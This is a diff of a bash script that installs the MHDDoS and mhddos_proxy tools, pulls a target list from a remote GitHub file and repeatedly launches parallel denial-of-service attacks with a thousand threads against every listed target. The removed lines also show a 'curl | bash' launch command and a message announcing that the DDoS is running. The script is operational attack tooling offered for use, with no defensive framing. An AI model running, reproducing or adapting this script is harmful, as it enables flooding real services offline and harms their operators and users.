@@ -1,65 +1,50 @@
 #!/bin/bash
-##### Use next command in local linux terminal to run this script.
-#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
-##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
-##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)
+# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
+sudo apt update -qq -y
+sudo apt install git python3 python3-pip -qq -y
+# for some virtual cloud systems based on debian (like GC)
+sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
+sudo pip install --upgrade pip
 
-##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
+cd ~
+sudo rm -r mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+# for avoid installing wget, otherwise it need to be added in install section
+rm proxies_config.json
+curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
+#wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
 
+git clone https://github.com/MHProDev/MHDDoS.git
+#change commit SHA and uncomment next 3 lines for revert to certain commit, when something code wrong happened
+#cd MHDDoS
+#git reset --hard d680dca8066c0fcea5ce59ece1ddf587a9eed79b
+#cd ..
+python3 -m pip install -r MHDDoS/requirements.txt
 
+threads="${1:-1000}"; threads="-t $threads"
+rpc="--rpc 1000"
+proxy_upd="-p 3600"
+debug="--debug"
 
-## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
-## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default (9m), can be passed as second parameter
-restart_interval="9m"
-
-
-#parameters that passed to python scrypt
-threads="${1:-1000}"
-threads="-t $threads"
-rpc="${2:-200}"
-rpc="--rpc $rpc"
-debug="${3:-}"
-proxy_interval="-p 600"
-
-#Just in case kill previous copy of mhddos_proxy
-pkill -f runner.py
-pkill -f ./start.py
-
-
-
-# Restart attacks and update targets list every 10 minutes (by default)
-while [[ 1 == 1 ]]
-#echo -e "#####################################\n"
+# Restart attacks and update targets every 20 minutes
+while true
 do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+   pkill -f start.py; pkill -f runner.py 
+   # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-   
-   echo -e "\nNumber of targets in list: $list_size \n"
-
-   
-      
-   # Launch multiple mhddos_proxy instances with different targets.
+   echo -e "\nNumber of targets in list: " $list_size "\n"
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+            echo -e "\nNumber of targets in list: " $list_size "\n"
+      done
    for (( i=1; i<=list_size; i++ ))
-   do
-            echo -e "\n I = $i"
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
-           
-
-            echo "full cmd:"
-            echo "$cmd_line $proxy_interval $threads $rpc"
-            
-            cd ~/mhddos_proxy
-            python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
-            echo -e "Attack started. Wait a few minutes for output"
-   done
-   
-   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
-   sleep $restart_interval
-   clear
-   echo -e "\nRESTARTING\nKilling old processes..."
-   pkill -f runner.py
-   pkill -f ./start.py
-   echo -e "\nOld processes have been killed - starting new ones"
+      do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
+            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+      done
+sleep 20m
 done
